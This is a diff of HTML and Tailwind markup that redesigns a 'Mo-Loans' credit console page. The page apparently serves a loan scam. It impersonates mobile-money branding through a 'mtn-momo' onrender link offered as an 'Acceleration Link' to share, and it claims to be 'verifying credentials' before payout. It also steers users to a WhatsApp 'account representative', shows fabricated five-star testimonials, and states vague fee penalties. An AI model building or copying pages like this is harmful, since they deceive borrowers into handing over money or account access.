@@ -6,12 +6,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Forces custom touch controls suitable for native mobile interfaces */
+        /* Optimizes tap highlights for touch screens */
         body {
             -webkit-tap-highlight-color: transparent;
-            user-select: none;
         }
-        /* Hide scrollbars for container elements to resemble an app window */
+        /* Hide scrollbars cross-browser for cleaner application styling */
         .no-scrollbar::-webkit-scrollbar {
             display: none;
         }
@@ -21,118 +20,161 @@
         }
     </style>
 </head>
-<body class="bg-slate-900 min-h-screen flex justify-center items-center font-sans antialiased">
+<body class="bg-slate-950 text-slate-900 font-sans antialiased min-h-screen flex flex-col md:flex-row">
 
-    <div class="w-full max-w-md h-screen sm:h-[840px] bg-slate-50 flex flex-col relative sm:rounded-2xl sm:shadow-2xl overflow-hidden border border-slate-200">
+    <aside class="hidden md:flex md:w-64 lg:w-72 bg-indigo-950 text-white flex-col fixed h-full z-30 border-r border-indigo-900">
+        <div class="p-6 bg-indigo-900/50 border-b border-indigo-900">
+            <h1 class="text-2xl font-black tracking-tight text-indigo-100">Mo-Loans</h1>
+            <p class="text-xs text-indigo-300 opacity-80">Management Interface</p>
+        </div>
         
-        <header class="bg-indigo-900 text-white px-4 pt-6 pb-4 flex justify-between items-center shrink-0 shadow-md">
-            <div>
-                <h1 class="text-xl font-black tracking-tight text-indigo-200">Mo-Loans</h1>
-                <p class="text-xs text-indigo-300 opacity-90">Secure Credit Console</p>
+        <nav class="flex-1 p-4 space-y-3">
+            <span class="text-[10px] font-bold text-indigo-400 uppercase tracking-wider block px-2">Pipeline Tracker</span>
+            <div class="bg-amber-500/10 border border-amber-500/30 text-amber-400 p-3 rounded-xl text-xs font-semibold">
+                ⏳ PENDING COMPLIANCE REVIEW
             </div>
-            <div class="text-right">
-                <span class="inline-block bg-indigo-800 text-indigo-200 text-[10px] font-mono px-2 py-0.5 rounded-full border border-indigo-700">
-                    ID: #MS-77291
-                </span>
+            <div class="text-slate-500 border border-transparent p-3 rounded-xl text-xs font-semibold opacity-40 cursor-not-allowed">
+                APPROVED DISBURSEMENT
             </div>
-        </header>
+            <div class="text-slate-500 border border-transparent p-3 rounded-xl text-xs font-semibold opacity-40 cursor-not-allowed">
+                DECLINED APPLICATION
+            </div>
+        </nav>
 
-        <main class="flex-1 overflow-y-auto no-scrollbar p-4 space-y-4 pb-20">
+        <div class="p-4 border-t border-indigo-900">
+            <button onclick="logout()" class="w-full bg-transparent border border-red-500/40 hover:bg-red-500/10 text-red-400 font-bold text-xs py-2.5 rounded-lg transition-colors">
+                Disconnect Console
+            </button>
+        </div>
+    </aside>
+
+    <header class="md:hidden bg-indigo-950 text-white px-4 pt-5 pb-4 flex justify-between items-center sticky top-0 z-30 shadow-md">
+        <div>
+            <h1 class="text-xl font-black tracking-tight text-indigo-200">Mo-Loans</h1>
+            <p class="text-[10px] text-indigo-300 opacity-90">Secure Credit Console</p>
+        </div>
+        <div>
+            <span class="inline-block bg-indigo-900 text-indigo-200 text-[9px] font-mono px-2 py-0.5 rounded-full border border-indigo-800">
+                ID: #MS-77291
+            </span>
+        </div>
+    </header>
+
+    <div class="flex-1 md:ml-64 lg:ml-72 flex flex-col bg-slate-50 min-h-screen">
+        
+        <div class="hidden md:flex bg-white border-b border-slate-200 px-8 py-4 justify-between items-center">
+            <h2 class="text-lg font-bold text-slate-800">Account Console</h2>
+            <div class="text-right text-xs text-slate-400">
+                <span>Application Reference: </span>
+                <span class="font-mono font-bold text-slate-600 bg-slate-100 px-2 py-0.5 rounded">#MS-77291</span>
+            </div>
+        </div>
+
+        <main class="flex-1 p-4 md:p-8 space-y-4 md:space-y-6 max-w-5xl w-full mx-auto pb-24 md:pb-8">
             
-            <section class="bg-white border-l-4 border-indigo-600 rounded-r-xl p-4 shadow-sm">
-                <div class="flex items-center space-x-2 text-indigo-900 font-bold text-sm mb-1">
+            <section class="bg-white border-l-4 border-indigo-600 rounded-r-xl p-4 md:p-6 shadow-sm border border-slate-200/60">
+                <div class="flex items-center space-x-2 text-indigo-950 font-bold text-sm md:text-base mb-1">
                     <svg class="w-4 h-4 text-indigo-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                     <span>Verification Phase Active</span>
                 </div>
-                <p class="text-xs text-slate-600 italic leading-relaxed">
+                <p class="text-xs md:text-sm text-slate-600 italic leading-relaxed">
                     "Financial tracking and auditing ensures a sustainable structure for our clients. Our compliance team is verifying submitted telemetry and credentials prior to disbursement initialization."
                 </p>
             </section>
 
-            <section class="bg-white rounded-xl p-3 shadow-sm">
-                <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 px-1">Pipeline Status</h3>
-                <div class="grid grid-cols-3 gap-2 text-center text-xs font-semibold">
-                    <div class="bg-amber-50 border border-amber-300 text-amber-700 p-2.5 rounded-lg">
-                        Pending
-                    </div>
-                    <div class="bg-slate-100 text-slate-400 p-2.5 rounded-lg opacity-50 cursor-not-allowed">
-                        Approved
-                    </div>
-                    <div class="bg-slate-100 text-slate-400 p-2.5 rounded-lg opacity-50 cursor-not-allowed">
-                        Declined
-                    </div>
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 md:gap-6 items-start">
+                
+                <div class="lg:col-span-2 space-y-4 md:space-y-6">
+                    
+                    <section class="md:hidden bg-white rounded-xl p-3 shadow-sm border border-slate-200/60">
+                        <h3 class="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-2 px-1">Pipeline Status</h3>
+                        <div class="grid grid-cols-3 gap-2 text-center text-xs font-semibold">
+                            <div class="bg-amber-50 border border-amber-200 text-amber-700 py-2 rounded-lg">Pending</div>
+                            <div class="bg-slate-100 text-slate-400 py-2 rounded-lg opacity-40 cursor-not-allowed">Approved</div>
+                            <div class="bg-slate-100 text-slate-400 py-2 rounded-lg opacity-40 cursor-not-allowed">Declined</div>
+                        </div>
+                    </section>
+
+                    <section class="bg-white rounded-xl p-4 md:p-6 shadow-sm border border-slate-200/60 space-y-4">
+                        <h3 class="text-sm md:text-base font-bold text-slate-800 flex items-center gap-2">
+                            <svg class="w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                            Action Center
+                        </h3>
+
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="bg-slate-50 rounded-xl p-3.5 border border-slate-200/80">
+                                <span class="text-xs font-bold text-indigo-900 block mb-0.5">Acceleration Link</span>
+                                <p class="text-[11px] text-slate-500 mb-2.5">Optimize verification priorities by establishing node connections.</p>
+                                <div class="flex gap-2">
+                                    <input type="text" id="refLink" readonly value="https://mtn-momo-xpih.onrender.com" 
+                                           class="bg-white border border-slate-300 rounded-md p-2 text-xs font-mono flex-1 min-w-0 text-slate-700 focus:outline-none">
+                                    <button onclick="copyLink()" class="bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold px-3 py-2 rounded-md transition-colors active:scale-95 shrink-0">
+                                        Copy
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div class="flex flex-col justify-between space-y-3">
+                                <div class="hidden md:block text-xs text-slate-500 leading-normal">
+                                    Need direct account mapping or processing assistance? Contact your assigned technical agent via instant messaging channels.
+                                </div>
+                                <a href="https://wa.me/254785460615" target="_blank" 
+                                   class="flex items-center justify-center space-x-2 bg-emerald-600 hover:bg-emerald-700 text-white text-xs md:text-sm font-bold p-3 rounded-xl transition-all active:scale-[0.99] shadow-sm">
+                                    <svg class="w-4 h-4 md:w-5 md:h-5 fill-current" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.514 2.266 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.503-5.714-1.458L0 24zm10.394-3.261c1.558.924 3.322 1.411 5.121 1.412 5.561 0 10.086-4.524 10.089-10.088.001-2.696-1.046-5.231-2.949-7.134a9.99 9.99 0 0 0-7.139-2.944C6.112 3.988 1.59 8.513 1.587 14.077c-.001 1.802.476 3.565 1.383 5.114l-.946 3.454 3.535-.927c1.492.813 3.16 1.241 4.852 1.242z"/></svg>
+                                    <span>Contact Account Representative</span>
+                                </a>
+                            </div>
+                        </div>
+
+                        <p class="text-[10px] text-slate-400 text-center leading-tight pt-1 border-t border-slate-100">
+                            Disbursement is routed dynamically over authorized networks upon ledger confirmation.
+                        </p>
+                    </section>
+
+                    <section class="bg-white rounded-xl p-4 md:p-6 shadow-sm border border-slate-200/60">
+                        <h3 class="text-sm md:text-base font-bold text-slate-800 mb-3 flex items-center gap-2">
+                            <svg class="w-4 h-4 text-amber-500" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
+                            User Experience Activity
+                        </h3>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-3 text-[11px] md:text-xs leading-snug">
+                            <div class="p-3 bg-slate-50 rounded-xl border border-slate-150">
+                                <span class="text-amber-500 block text-[10px] mb-1">★★★★★</span>
+                                <span class="font-bold text-slate-700">Tendai M.</span>: Processing finalized and allocated without friction.
+                            </div>
+                            <div class="p-3 bg-slate-50 rounded-xl border border-slate-150">
+                                <span class="text-amber-500 block text-[10px] mb-1">★★★★★</span>
+                                <span class="font-bold text-slate-700">Nyasha K.</span>: Network verification structure adjusted promptly.
+                            </div>
+                            <div class="p-3 bg-slate-50 rounded-xl border border-slate-150">
+                                <span class="text-amber-500 block text-[10px] mb-1">★★★★☆</span>
+                                <span class="font-bold text-slate-700">Blessing T.</span>: Representative configuration assistance completed safely.
+                            </div>
+                        </div>
+                    </section>
                 </div>
-            </section>
 
-            <section class="bg-white rounded-xl p-4 shadow-sm border border-slate-100 space-y-3">
-                <h3 class="text-sm font-bold text-slate-800 flex items-center gap-1.5">
-                    <svg class="w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                    Action Center
-                </h3>
-
-                <div class="bg-slate-50 rounded-lg p-3 border border-slate-200">
-                    <span class="text-xs font-bold text-indigo-900 block mb-0.5">Acceleration Link</span>
-                    <p class="text-[11px] text-slate-500 mb-2">Optimize verification priorities by establishing node connections.</p>
-                    <div class="flex gap-2">
-                        <input type="text" id="refLink" readonly value="https://mtn-momo-xpih.onrender.com" 
-                               class="bg-white border border-slate-300 rounded-md p-1.5 text-xs font-mono flex-1 min-width-0 text-slate-700 focus:outline-none">
-                        <button onclick="copyLink()" class="bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold px-3 py-1.5 rounded-md transition-colors active:scale-95">
-                            Copy
-                        </button>
-                    </div>
+                <div class="lg:col-span-1">
+                    <section class="bg-white rounded-xl p-4 md:p-6 shadow-sm border border-slate-200/60">
+                        <h3 class="text-sm font-bold text-slate-800 mb-2">Compliance & Provisions</h3>
+                        <ul class="list-disc pl-4 text-[11px] md:text-xs text-slate-500 space-y-2">
+                            <li>Applications undergo a strict validation period ranging between 48 to 72 hours.</li>
+                            <li>Deferred settlements incur statutory operational adjustments up to 15% aggregate.</li>
+                            <li>Platform reserves the right to re-evaluate local parameters to prevent fraudulent allocations.</li>
+                        </ul>
+                    </section>
                 </div>
 
-                <a href="https://wa.me/254785460615" target="_blank" 
-                   class="flex items-center justify-center space-x-2 bg-emerald-600 hover:bg-emerald-700 text-white text-sm font-bold p-3 rounded-lg transition-all active:scale-[0.99] shadow-sm">
-                    <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.514 2.266 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.503-5.714-1.458L0 24zm10.394-3.261c1.558.924 3.322 1.411 5.121 1.412 5.561 0 10.086-4.524 10.089-10.088.001-2.696-1.046-5.231-2.949-7.134a9.99 9.99 0 0 0-7.139-2.944C6.112 3.988 1.59 8.513 1.587 14.077c-.001 1.802.476 3.565 1.383 5.114l-.946 3.454 3.535-.927c1.492.813 3.16 1.241 4.852 1.242z"/></svg>
-                    <span>Contact Account Representative</span>
-                </a>
-
-                <p class="text-[10px] text-slate-400 text-center leading-tight pt-1">
-                    Disbursement is routed dynamically over authorized networks upon ledger confirmation.
-                </p>
-            </section>
-
-            <section class="bg-white rounded-xl p-4 shadow-sm border border-slate-100">
-                <h3 class="text-sm font-bold text-slate-800 mb-3 flex items-center gap-1.5">
-                    <svg class="w-4 h-4 text-amber-500" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                    User Experience Activity
-                </h3>
-                <div class="space-y-2 max-h-40 overflow-y-auto pr-1 no-scrollbar text-[12px] leading-snug">
-                    <div class="p-2 bg-slate-50 rounded border border-slate-150">
-                        <span class="text-amber-500 block text-[10px]">★★★★★</span>
-                        <span class="font-bold text-slate-700">Tendai M.</span>: Processing finalized and allocated without friction.
-                    </div>
-                    <div class="p-2 bg-slate-50 rounded border border-slate-150">
-                        <span class="text-amber-500 block text-[10px]">★★★★★</span>
-                        <span class="font-bold text-slate-700">Nyasha K.</span>: Network verification structure adjusted promptly.
-                    </div>
-                    <div class="p-2 bg-slate-50 rounded border border-slate-150">
-                        <span class="text-amber-500 block text-[10px]">★★★★☆</span>
-                        <span class="font-bold text-slate-700">Blessing T.</span>: Representative configuration assistance completed safely.
-                    </div>
-                </div>
-            </section>
-
-            <section class="bg-white rounded-xl p-4 shadow-sm border border-slate-100">
-                <h3 class="text-sm font-bold text-slate-800 mb-2">Compliance & Provisions</h3>
-                <ul class="list-disc pl-4 text-[11px] text-slate-500 space-y-1.5">
-                    <li>Applications undergo a strict validation period ranging between 48 to 72 hours.</li>
-                    <li>Deferred settlements incur statutory operational adjustments up to 15% aggregate.</li>
-                    <li>Platform reserves the right to re-evaluate local parameters to prevent fraudulent allocations.</li>
-                </ul>
-            </section>
-
+            </div>
         </main>
 
-        <footer class="absolute bottom-0 left-0 right-0 h-16 bg-white border-t border-slate-200 flex justify-around items-center shrink-0 z-20 px-6">
+        <footer class="md:hidden fixed bottom-0 left-0 right-0 h-16 bg-white border-t border-slate-200 flex justify-around items-center shrink-0 z-30 px-6 shadow-[0_-2px_10px_rgba(0,0,0,0.05)]">
             <button class="flex flex-col items-center text-indigo-600">
                 <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>
-                <span class="text-[10px] font-bold mt-0.5">Home</span>
+                <span class="text-[9px] font-bold mt-0.5">Home</span>
             </button>
             <button onclick="logout()" class="flex flex-col items-center text-slate-400 hover:text-red-500 transition-colors">
                 <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
-                <span class="text-[10px] font-bold mt-0.5">Disconnect</span>
+                <span class="text-[9px] font-bold mt-0.5">Disconnect</span>
             </button>
         </footer>
 
